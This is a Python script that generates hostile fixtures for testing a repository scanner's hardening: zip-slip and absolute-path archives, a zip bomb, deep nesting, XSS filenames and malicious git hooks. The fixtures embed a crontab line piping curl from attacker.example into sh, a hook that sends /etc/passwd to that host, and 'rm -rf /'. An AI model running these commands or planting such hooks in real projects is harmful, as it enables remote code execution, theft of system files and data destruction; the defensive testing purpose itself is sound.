"""
create_hostile_fixtures.py
──────────────────────────
Generates all hostile test fixture files programmatically.
Run once before running test_hostile_repo_hardening.py.

Usage: python create_hostile_fixtures.py
"""

import io
import os
import struct
import zipfile

BASE = os.path.dirname(os.path.abspath(__file__))
HOSTILE = os.path.join(BASE, "fixtures", "hostile")
os.makedirs(HOSTILE, exist_ok=True)


# ─── 1. Zip-slip archive ───────────────────────────────────────────────────────
def make_zip_slip():
    path = os.path.join(HOSTILE, "zip_slip.zip")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        # Normal file
        z.writestr("safe.txt", "safe content")
        # Path-traversal entry — tries to write outside the target dir
        z.writestr("../../etc/passwd", "malicious content")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    print(f"  Created {path}")


# ─── 2. Absolute-path zip ──────────────────────────────────────────────────────
def make_absolute_path_zip():
    path = os.path.join(HOSTILE, "absolute_path.zip")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("/etc/crontab", "* * * * * root curl http://attacker.example/shell | sh")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    print(f"  Created {path}")


# ─── 3. Zip bomb ───────────────────────────────────────────────────────────────
def make_zip_bomb():
    """
    A "small" zip bomb: 10 MB of zeros compressed into a tiny archive.
    Real billion-laugh bombs are much bigger; this is safe for CI but still
    exercises the ratio guard.
    """
    path = os.path.join(HOSTILE, "zip_bomb.zip")
    payload = b"\x00" * (10 * 1024 * 1024)  # 10 MB zeros
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        z.writestr("bomb.txt", payload)
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    compressed_size = os.path.getsize(path)
    ratio = len(payload) / compressed_size
    print(f"  Created {path}  (compressed {compressed_size} bytes, ratio ~{ratio:.0f}x)")


# ─── 4. Too-many-files zip ────────────────────────────────────────────────────
def make_too_many_files_zip():
    path = os.path.join(HOSTILE, "too_many_files.zip")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for i in range(51_000):
            z.writestr(f"file_{i}.txt", "x")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    print(f"  Created {path}")


# ─── 5. Deeply nested zip ─────────────────────────────────────────────────────
def make_deep_nesting_zip():
    path = os.path.join(HOSTILE, "deep_nesting.zip")
    # 30 levels of nesting — exceeds the default limit of 20
    deep_path = "/".join([f"dir{i}" for i in range(30)]) + "/deep.txt"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(deep_path, "deeply nested content")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    print(f"  Created {path}")


# ─── 6. Malicious git pre-receive hook ────────────────────────────────────────
def make_malicious_git_hooks():
    repo_dir  = os.path.join(HOSTILE, "malicious_git_repo")
    hooks_dir = os.path.join(repo_dir, ".git", "hooks")
    os.makedirs(hooks_dir, exist_ok=True)

    # pre-receive hook — would execute if cloned with hooks enabled
    hook_path = os.path.join(hooks_dir, "pre-receive")
    with open(hook_path, "w") as f:
        f.write("#!/bin/sh\ncurl http://attacker.example/exfil?token=$(cat /etc/passwd)\n")

    # post-checkout hook
    hook2 = os.path.join(hooks_dir, "post-checkout")
    with open(hook2, "w") as f:
        f.write("#!/bin/sh\nrm -rf /\n")

    # Legitimate Python file in the repo
    src_dir = os.path.join(repo_dir, "src")
    os.makedirs(src_dir, exist_ok=True)
    with open(os.path.join(src_dir, "main.py"), "w") as f:
        f.write("import hashlib\nhashlib.md5(b'hello')\n")

    print(f"  Created {repo_dir}")


# ─── 7. XSS-payload filename zip ──────────────────────────────────────────────
def make_xss_filename_zip():
    path = os.path.join(HOSTILE, "xss_filename.zip")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        # Filename with XSS payload
        z.writestr('<script>alert(1)</script>.py', "import hashlib\n")
        z.writestr("../../escape.py", "# traversal attempt too\n")
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    print(f"  Created {path}")


# ─── 8. Huge single file (simulated — 60 MB, just over the 50 MB limit) ───────
def make_huge_file():
    """
    We write a 60 MB Python file — exceeds SCANNER_MAX_FILE_SIZE_MB default (10 MB
    for scanning; 50 MB for upload).
    We place it in a directory (not a zip) so the pipeline's size guard is tested.
    """
    dir_path  = os.path.join(HOSTILE, "huge_file_repo")
    os.makedirs(dir_path, exist_ok=True)
    file_path = os.path.join(dir_path, "huge.py")
    with open(file_path, "wb") as f:
        # Write valid Python then pad with comments to 60 MB
        f.write(b"# generated large file\nimport hashlib\n")
        f.write(b"# " + b"x" * 1024 + b"\n") * 1  # warm up
        chunk = b"# " + b"A" * 1022 + b"\n"  # 1025 bytes per line
        target_bytes = 60 * 1024 * 1024
        written = 42
        while written < target_bytes:
            f.write(chunk)
            written += len(chunk)
    actual = os.path.getsize(file_path)
    print(f"  Created {file_path} ({actual // 1024 // 1024} MB)")


# ─── 9. Deeply nested JSON (AST-depth attack) ─────────────────────────────────
def make_deep_json():
    dir_path  = os.path.join(HOSTILE, "deep_nesting")
    os.makedirs(dir_path, exist_ok=True)
    file_path = os.path.join(dir_path, "deeply_nested.json")
    # Build 1000-level nested JSON — naive parsers may stack-overflow
    depth   = 1000
    opening = '{"a":' * depth
    closing = "}" * depth
    with open(file_path, "w") as f:
        f.write(opening + '"value"' + closing)
    print(f"  Created {file_path} (depth={depth})")


# ─── 10. Infinite-loop-style file (minified single-line) ──────────────────────
def make_infinite_loop_style():
    dir_path  = os.path.join(HOSTILE, "xss_filenames")
    os.makedirs(dir_path, exist_ok=True)
    # A single 10 000-character line that looks like minified JS
    file_path = os.path.join(dir_path, "minified.min.js")
    with open(file_path, "w") as f:
        f.write("var x=" + "1+" * 5000 + "1;")
    print(f"  Created {file_path}")


if __name__ == "__main__":
    print("Creating hostile fixtures …")
    make_zip_slip()
    make_absolute_path_zip()
    make_zip_bomb()
    make_too_many_files_zip()
    make_deep_nesting_zip()
    make_malicious_git_hooks()
    make_xss_filename_zip()
    make_huge_file()
    make_deep_json()
    make_infinite_loop_style()
    print("Done.")
